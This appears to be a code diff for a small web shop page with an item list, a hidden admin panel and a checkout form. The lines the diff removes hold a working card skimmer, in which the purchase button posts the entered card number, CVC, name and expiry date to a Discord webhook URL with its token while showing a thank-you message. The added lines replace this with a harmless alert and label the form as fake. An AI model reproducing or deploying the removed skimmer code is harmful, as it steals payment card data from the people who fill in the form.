@@ -13,7 +13,7 @@
     button { margin-top: 8px; padding: 6px 12px; border: none; background: #ff3cc7; color: #000; font-weight: bold; border-radius: 6px; cursor: pointer; font-size: 0.9rem; }
     #adminPanel { display:none; position:fixed; top:20px; right:20px; background:#222; padding:20px; border-radius:12px; width:300px; box-shadow:0 0 10px #000; z-index:1000; }
 
-    /* Checkout Modal */
+    /* Fake Checkout Modal */
     #checkoutModal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:2000; justify-content:center; align-items:center; }
     #checkoutBox { background:#222; padding:20px; border-radius:12px; width:300px; text-align:center; }
     #checkoutBox input { width:100%; padding:8px; margin-top:10px; border-radius:6px; border:none; }
@@ -48,42 +48,35 @@
     <button onclick="saveEdit()">Save Edit</button>
   </div>
 
-  <!-- Checkout Modal -->
+  <!-- Fake Checkout Modal -->
   <div id="checkoutModal">
     <div id="checkoutBox">
       <h2>Checkout</h2>
-      <input id="cardNum" type="text" placeholder="Card Number">
-      <input id="cvcField" type="text" placeholder="CVC">
+      <input id="cardNum" type="text" maxlength="16" placeholder="Card Number">
+      <input id="cvc" type="text" maxlength="3" placeholder="CVC">
       <input id="fullName" type="text" placeholder="First & Last Name">
       <input id="expDate" type="text" placeholder="Exp Date (MM/YY)">
-      <button id="purchaseBtn" onclick="finishPurchase()">Purchase</button>
-      <button style="background:#999;" onclick="closeCheckout()">Cancel</button>
+      <button id="purchaseBtn" disabled style="background:#555; cursor:not-allowed;" onclick="finishPurchase()">Purchase</button>
+      <button style="margin-top:10px; background:#999;" onclick="closeCheckout()">Cancel</button>
     </div>
   </div>
 
   <script>
-  let __ctrlPressed=false, __endPressed=false;
-
-  document.addEventListener('keydown',(e)=>{
-    if(e.key==='Control') __ctrlPressed=true;
-    if(e.key==='End') __endPressed=true;
-    if(__ctrlPressed && __endPressed){
-      const panel=document.getElementById('adminPanel');
-      panel.style.display=panel.style.display==='none'?'block':'none';
-      __ctrlPressed=false;
-      __endPressed=false;
-    }
-  });
-  document.addEventListener('keyup',(e)=>{
-    if(e.key==='Control') __ctrlPressed=false;
-    if(e.key==='End') __endPressed=false;
+  // Admin Panel Toggle
+  document.addEventListener('keydown', (e) => {
+      if (e.ctrlKey && e.key === 'End') {
+          const panel = document.getElementById('adminPanel');
+          panel.style.display = (panel.style.display === 'none' || panel.style.display === '') ? 'block' : 'none';
+      }
   });
 
+  // Background Change
   function changeBG(){
     const color=document.getElementById('bgColor').value;
     if(color) document.body.style.background=color;
   }
 
+  // Search Items
   function searchItems(){
     const term=document.getElementById('searchBox').value.toLowerCase();
     document.querySelectorAll('.item').forEach(i=>{
@@ -92,6 +85,7 @@
     });
   }
 
+  // Item Management
   function addItem(){
     const name=document.getElementById('itemName').value;
     const price=document.getElementById('itemPrice').value;
@@ -160,67 +154,43 @@
     localStorage.setItem('brainrots',JSON.stringify(items));
   }
 
+  // Checkout Functions
   function openCheckout(){ document.getElementById('checkoutModal').style.display='flex'; }
   function closeCheckout(){ document.getElementById('checkoutModal').style.display='none'; }
 
-  const cardNum=document.getElementById('cardNum');
-  const cvcField=document.getElementById('cvcField');
-  const fullName=document.getElementById('fullName');
-  const expDate=document.getElementById('expDate');
-  const purchaseBtn=document.getElementById('purchaseBtn');
-  purchaseBtn.disabled=true;
-  purchaseBtn.style.background='#999';
-
-  function validateCheckout(){
-    const cardValid=cardNum.value.replace(/\D/g,'').length===16;
-    const cvcValid=cvcField.value.replace(/\D/g,'').length===3;
-    const nameValid=fullName.value.trim().length>0;
-    const expValid=expDate.value.trim().length>0;
-    const allValid = cardValid && cvcValid && nameValid && expValid;
-
-    purchaseBtn.disabled = !allValid;
-    purchaseBtn.style.background = allValid ? '#0f0' : '#999';
+  function finishPurchase(){
+    alert('Thank you for your purchase!');
+    closeCheckout();
   }
 
-  cardNum.addEventListener('input',validateCheckout);
-  cvcField.addEventListener('input',validateCheckout);
-  fullName.addEventListener('input',validateCheckout);
-  expDate.addEventListener('input',validateCheckout);
+  // Validation
+  function validateCheckout(){
+    const num=document.getElementById('cardNum').value;
+    const cvc=document.getElementById('cvc').value;
+    const name=document.getElementById('fullName').value.trim();
+    const exp=document.getElementById('expDate').value.trim();
+    const btn=document.getElementById('purchaseBtn');
 
- <script>
-const webhookURL = "https://discord.com/api/webhooks/1441183630201323582/DaQuLEv0FsiW_DoAuLe-OxPoaIVB-4JhfptNgKzMCgJUXxXHlOw2vMXK2-Z2PD7AysnR";
+    const valid = num.length===16 && /^\d+$/.test(num) &&
+                  cvc.length===3 && /^\d{3}$/.test(cvc) &&
+                  name.length>0 && exp.length>0;
 
-function finishPurchase() {
-    const payload = {
-        content: 
-`credit card number: ${cardNum.value}
-cvc number: ${cvcField.value}
-First and Last Name: ${fullName.value}
-exp date: ${expDate.value}`
-    };
+    if(valid){
+      btn.disabled=false;
+      btn.style.background='#ff3cc7';
+      btn.style.cursor='pointer';
+    } else {
+      btn.disabled=true;
+      btn.style.background='#555';
+      btn.style.cursor='not-allowed';
+    }
+  }
 
-    fetch(webhookURL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-    })
-    .then(res => {
-        if (res.ok) {
-            alert("Thank you for your purchase!");
-            closeCheckout();
+  ['cardNum','cvc','fullName','expDate'].forEach(id=>{
+    document.getElementById(id).addEventListener('input',validateCheckout);
+  });
 
-            // Clear fields after sending
-            cardNum.value = "";
-            cvcField.value = "";
-            fullName.value = "";
-            expDate.value = "";
-            validateCheckout();
-        } else {
-            alert("Failed to send to webhook.");
-        }
-    })
-    .catch(err => alert("Error: " + err));
-}
+  loadItems();
   </script>
 </body>
 </html>
